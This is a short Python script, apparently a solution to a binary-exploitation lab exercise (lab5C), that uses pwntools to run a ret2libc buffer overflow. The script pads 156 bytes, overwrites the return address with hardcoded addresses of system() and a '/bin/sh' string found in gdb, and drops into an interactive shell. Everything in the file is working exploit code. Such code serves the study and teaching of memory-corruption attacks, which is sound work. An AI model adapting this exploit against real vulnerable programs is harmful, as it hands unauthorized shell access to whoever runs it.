import pwn

# mem address of libc and /bin/sh
# got from 'p system' and 'searchmem "/bin/sh" respectively in gdb
system_addr = 0xb7e61310
binsh_addr  = 0xb7f83d4c

p = pwn.process('/levels/lab05/lab5C')
print(p.recv(100))

exploit_str = 'a' * 156
exploit_str += pwn.p32(system_addr)
exploit_str += 'SH!T' # 4 bytes of junk
exploit_str += pwn.p32(binsh_addr)

p.sendline(exploit_str)
p.interactive()
